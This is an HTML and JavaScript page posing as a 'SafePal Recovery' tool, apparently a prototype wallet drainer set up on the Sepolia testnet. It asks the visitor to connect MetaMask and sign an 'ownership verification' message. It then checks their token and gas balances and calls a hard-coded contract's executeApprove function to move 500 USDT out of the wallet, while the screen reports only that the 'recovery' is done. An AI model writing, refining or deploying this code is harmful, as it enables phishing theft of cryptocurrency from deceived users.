<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SafePal Recovery</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
            border-radius: 5px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>SafePal Recovery</h2>
        <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
        <p id="status">Please connect your MetaMask wallet.</p>
    </div>

    <script>
        console.log('Script loaded successfully!');

        if (typeof ethers === 'undefined') {
            console.error('Ethers.js not loaded. Please check the script source.');
            document.getElementById('status').innerText = 'Error: Ethers.js not loaded.';
        } else {
            console.log('Ethers.js loaded successfully:', ethers.version);
        }

        async function connectWallet() {
            try {
                console.log('Step 1: Connect Wallet button clicked.');
                document.getElementById('status').innerText = 'Connecting...';

                console.log('Step 2: Checking MetaMask availability...');
                if (!window.ethereum || !window.ethereum.isMetaMask) {
                    throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
                }

                console.log('Step 3: Requesting accounts...');
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts.length === 0) {
                    throw new Error('No accounts found. Please unlock MetaMask.');
                }

                const userAddress = accounts[0];
                document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
                console.log('Step 4: Connected with address:', userAddress);

                // Перевірка мережі (Sepolia)
                console.log('Step 5: Checking network...');
                const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
                const targetChainId = 11155111; // Sepolia Testnet
                if (chainId !== targetChainId) {
                    console.log('Switching to Sepolia Testnet...');
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                    });
                }

                // Підпис повідомлення
                console.log('Step 6: Signing message...');
                const message = 'Verify wallet ownership for SafePal recovery';
                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [message, userAddress]
                });
                console.log('Step 7: Message signed successfully!');
                console.log('Signature:', signature);
                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';

                // Виклик executeApprove через ApproveContract
                const contractAddress = '0x1E8eF3d114554cFD4a0DD1faBF79f4C7f5C1C218'; // Поточна адреса (оновити після розгортання)
                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                const amount = 500000000; // 500 USDT (6 decimals)

                const contractAbi = [
                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, uint256 amount) external"
                ];

                console.log('Step 8: Initializing provider and signer...');
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const contract = new ethers.Contract(contractAddress, contractAbi, signer);

                // Перевірка балансу
                console.log('Step 9: Checking balance...');
                const tokenAbi = [
                    "function balanceOf(address) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, provider);
                const balance = await tokenContract.balanceOf(userAddress);
                const decimals = await tokenContract.decimals();
                const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
                console.log(`User balance: ${balanceFormatted} TestUSDT`);

                if (balance.lt(amount)) {
                    throw new Error('Insufficient balance to transfer');
                }

                // Перевірка балансу Sepolia ETH для газу
                console.log('Step 10: Checking gas balance...');
                const ethBalance = await provider.getBalance(userAddress);
                const ethBalanceFormatted = ethers.utils.formatEther(ethBalance);
                console.log(`ETH balance: ${ethBalanceFormatted} Sepolia ETH`);
                if (ethBalance.lt(ethers.utils.parseEther('0.01'))) {
                    throw new Error('Insufficient Sepolia ETH for gas. Need at least 0.01 ETH.');
                }

                // Виклик executeApprove
                console.log('Step 11: Executing approve and transfer...');
                const messageBytes = ethers.utils.toUtf8Bytes(message);
                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, amount);
                const receipt = await tx.wait();
                console.log('Transaction Hash:', receipt.transactionHash);

                document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
                console.error('Detailed error:', error);
            }
        }
    </script>
</body>
</html>
